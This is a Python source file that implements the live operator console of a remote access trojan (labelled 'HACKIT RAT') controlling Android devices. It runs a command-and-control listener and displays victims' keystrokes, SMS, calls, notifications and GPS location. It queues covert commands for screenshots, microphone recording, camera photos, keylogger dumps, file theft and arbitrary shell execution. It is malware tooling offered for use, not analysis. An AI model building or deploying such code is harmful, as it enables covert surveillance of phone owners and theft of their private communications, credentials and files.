"""Live operator UI: a full-screen terminal that fills itself from the C2.

Sessions on the left, events and keystrokes on the right, location and task
state underneath, one command line at the bottom. The listener runs on its own
thread, so the screen never blocks a beacon and a slow disk never freezes the
feed. If stdout is not a TTY it degrades to a plain line feed.
"""
from __future__ import annotations

import asyncio
import os
import shutil
import threading
import time
from typing import Dict, List, Optional

from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_RED, B_WHITE, B_YELLOW, DIM, GREEN

from . import protocol, store
from .server import Hub, make_app

KIND_COLOR = {
    "keylog": B_MAGENTA,
    "sms": B_CYAN,
    "call": B_CYAN,
    "notif": B_WHITE,
    "loc": B_GREEN,
    "cam": B_YELLOW,
    "mic": B_YELLOW,
    "clip": B_WHITE,
    "probe": DIM,
    "info": DIM,
    "native": DIM,
    "register": GREEN,
    "shell": B_RED,
}

HELP = [
    ("1-9 / j k", "select session"),
    ("s / m / c", "screenshot / mic 15s / photo"),
    ("i", "device info"),
    ("l", "one location fix"),
    ("g", "drain keylogger"),
    ("a", "installed apps"),
    ("f <path>", "list a directory"),
    ("p <path>", "pull a file"),
    ("x <cmd>", "run a shell command"),
    ("r", "force refresh"),
    ("q", "quit"),
]


class LiveUI:
    def __init__(self, host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
        self.hub = Hub(psk=psk, token="operator", public_url=public_url, udp_port=udp_port)
        self.host = host
        self.port = port
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._serve, name="c2", daemon=True)
        self.sessions: List[dict] = []
        self.index = 0
        self.feed: List[tuple] = []
        self.keys: List[str] = []
        self.tasks: Dict[int, str] = {}
        self.seen_events: Dict[str, int] = {}
        self.message = ""
        self.started = time.time()
        self.width = 100
        self.height = 30

    # ------------------------------------------------------------- server
    def _serve(self) -> None:
        from aiohttp import web

        asyncio.set_event_loop(self.loop)
        app = make_app(self.hub)

        async def boot() -> None:
            runner = web.AppRunner(app, access_log=None)
            await runner.setup()
            site = web.TCPSite(runner, self.host, self.port)
            await site.start()

        self.loop.create_task(boot())
        self.loop.run_forever()

    def start(self) -> None:
        self.thread.start()
        time.sleep(0.3)
        self.refresh()

    # -------------------------------------------------------------- state
    def current(self) -> Optional[dict]:
        if not self.sessions:
            return None
        self.index = max(0, min(self.index, len(self.sessions) - 1))
        return self.sessions[self.index]

    def refresh(self) -> None:
        store.mark_offline(self.hub.offline_after)
        self.sessions = store.sessions()
        session = self.current()
        if not session:
            return
        sid = session["sid"]
        last = self.seen_events.get(sid, 0)
        for event in store.events(sid, after_id=last, limit=40):
            self.seen_events[sid] = event["id"]
            stamp = time.strftime("%H:%M:%S", time.localtime(event["ts"]))
            self.feed.append((stamp, event["kind"], _compact(event["body"], 220)))
        del self.feed[:-60]
        for task in store.tasks(sid, 12):
            state = task["state"]
            if self.tasks.get(task["id"]) != state and state != "queued":
                self.tasks[task["id"]] = state
                if task.get("output"):
                    self.feed.append((time.strftime("%H:%M:%S"), "out:" + task["cmd"],
                                      _compact(task["output"], 200)))
        for row in store.keylogs(sid, 0, 200)[-12:]:
            line = f"[{row['package']}] {row['text']}"
            if line not in self.keys:
                self.keys.append(line)
        del self.keys[:-14]

    def queue(self, cmd: str, args: Optional[List[str]] = None) -> None:
        session = self.current()
        if not session:
            self.message = "no session"
            return
        try:
            task_id = store.queue_task(session["sid"], cmd, args or [])
        except protocol.ProtocolError as exc:
            self.message = str(exc)
            return
        self.hub.wake(session["sid"])
        self.message = f"queued #{task_id} {cmd}"

    # ------------------------------------------------------------- render
    def render(self) -> str:
        size = shutil.get_terminal_size((100, 30))
        self.width = max(72, min(size.columns, 200))
        self.height = max(18, size.lines)
        width = self.width
        session = self.current()
        header = (
            f" HACKIT RAT · {self.hub.public_url} · up {int(time.time() - self.started)}s "
            f"· {sum(1 for s in self.sessions if s['online'])}/{len(self.sessions)} online"
        )
        left_w = 30
        right_w = width - left_w - 3
        lines: List[str] = [_colored(header, B_CYAN), _colored("─" * width, DIM)]

        left: List[str] = []
        for i, row in enumerate(self.sessions[:9]):
            mark = _colored("▸", B_GREEN) if i == self.index else " "
            dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
            kind = row.get("kind", "apk")[:4]
            label = f"{mark}{dot}{kind} {row['label'][:18]:<18}"
            left.append(label)
            left.append(f"   {_colored((row.get('model') or '?')[:24], DIM)} {row.get('battery') or 0}%")
        while len(left) < self.height - 10:
            left.append("")

        right: List[str] = [_colored("FEED", B_WHITE)]
        for stamp, kind, body in self.feed[-9:]:
            color = KIND_COLOR.get(kind, DIM)
            right.append(f"{_colored(stamp, DIM)} {_colored(kind[:7].ljust(7), color)} {_clip(body, right_w - 18)}")
        right.append("")
        right.append(_colored("KEYS", B_WHITE))
        for line in self.keys[-4:]:
            right.append(_clip(line, right_w))
        while len(right) < self.height - 10:
            right.append("")

        body = self.height - 8
        for row in range(body):
            left_line = _pad(left[row] if row < len(left) else "", left_w - 1)
            right_line = _pad(right[row] if row < len(right) else "", right_w)
            lines.append(left_line + " │ " + right_line)

        lines.append(_colored("─" * width, DIM))
        if session:
            loc = store.locations(session["sid"], 1)
            tasks = store.tasks(session["sid"], 4)
            info = (
                f" {session['sid'][:14]} {session.get('model') or '?'} · sdk {session.get('sdk')} · "
                f"{session.get('battery') or 0}% · {session.get('pub_ip') or '-'}"
            )
            if loc:
                info += f" · {_colored(f'{loc[0]['lat']:.4f},{loc[0]['lon']:.4f}', GREEN)}"
            if tasks:
                info += " · " + " ".join(f"{t['cmd']}:{t['state'][:3]}" for t in tasks)
            lines.append(_clip(info, width - 2))
        else:
            lines.append(_colored(" no sessions — build and install an apk first", DIM))
        if self.message:
            lines.append(_colored(" " + self.message, B_YELLOW))
            self.message = ""
        else:
            lines.append("")
        lines.append(_colored(" help · 1-9 select · s/m/c · i l g a f p x · q ", DIM))
        return "\n".join(lines)

    # -------------------------------------------------------------- input
    def handle(self, line: str) -> bool:
        parts = line.split()
        if not parts:
            self.refresh()
            return True
        verb = parts[0].lower()
        args = parts[1:]
        if verb in ("q", "quit", "exit"):
            return False
        if verb in ("help", "?"):
            for name, desc in HELP:
                self.message = self.message
                print(f"  {name:<14} {desc}")
            return True
        if verb in ("j", "k") or verb.isdigit():
            if verb == "j":
                self.index = min(self.index + 1, len(self.sessions) - 1)
            elif verb == "k":
                self.index = max(self.index - 1, 0)
            else:
                self.index = max(0, min(int(verb) - 1, len(self.sessions) - 1))
            self.refresh()
            return True
        if verb == "s":
            self.queue("screenshot")
        elif verb == "m":
            self.queue("mic_rec", ["15"])
        elif verb == "c":
            self.queue("cam_shot")
        elif verb == "i":
            self.queue("info")
        elif verb == "l":
            self.queue("loc")
        elif verb == "g":
            self.queue("keylog_dump")
        elif verb == "a":
            self.queue("apps")
        elif verb == "f":
            self.queue("files_ls", [" ".join(args) or "."])
        elif verb == "p":
            self.queue("files_pull", [" ".join(args)])
        elif verb == "x":
            self.queue("shell", [" ".join(args)])
        elif verb == "r":
            self.refresh()
        else:
            self.queue(verb, args)
        return True

    def run(self) -> None:
        interactive = os.isatty(0) and os.isatty(1)
        if not interactive:
            while True:
                try:
                    line = input("rat> ")
                except EOFError:
                    return
                self.refresh()
                print(self.render())
                if not self.handle(line):
                    return
        import select
        import sys
        import termios
        import tty

        fd = sys.stdin.fileno()
        saved = termios.tcgetattr(fd)
        buffer = ""
        try:
            tty.setraw(fd)
            while True:
                os.write(1, b"\x1b[2J\x1b[H")
                os.write(1, self.render().encode("utf-8", "replace"))
                self.refresh()
                ready, _, _ = select.select([fd], [], [], 1.0)
                if not ready:
                    continue
                data = os.read(fd, 32).decode("utf-8", "replace")
                for char in data:
                    if char in ("\x03", "\x04"):
                        raise KeyboardInterrupt
                    if char in ("\r", "\n"):
                        line = buffer.strip()
                        buffer = ""
                        if line and not self.handle(line):
                            return
                        continue
                    if char == "q" and not buffer:
                        raise KeyboardInterrupt
                    if char in ("\x7f", "\b"):
                        buffer = buffer[:-1]
                        continue
                    if char == "\x1b":
                        continue
                    buffer = (buffer + char)[:120]
                os.write(1, f"\x1b[{self.height};1H\x1b[2K ".encode())
                os.write(1, buffer.encode("utf-8", "replace"))
        except KeyboardInterrupt:
            pass
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, saved)


def _clip(text: str, width: int) -> str:
    text = str(text).replace("\n", " ")
    return text if len(text) <= width else text[: max(0, width - 1)] + "…"


def _pad(text: str, width: int) -> str:
    return text + " " * max(0, width - _visible_len(text))


def _visible_len(text: str) -> int:
    total = 0
    index = 0
    while index < len(text):
        if text[index] == "\x1b":
            index += 2
            while index < len(text) and not text[index].isalpha():
                index += 1
            index += 1
            continue
        total += 1
        index += 1
    return total


def _compact(body: str, limit: int) -> str:
    text = body if len(body) <= limit else body[:limit] + "…"
    return text.replace("\n", " ")


def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
    store.init()
    live = LiveUI(host, port, psk, public_url, udp_port)
    live.start()
    try:
        live.run()
    finally:
        print(_colored("\n  listener stopped", DIM))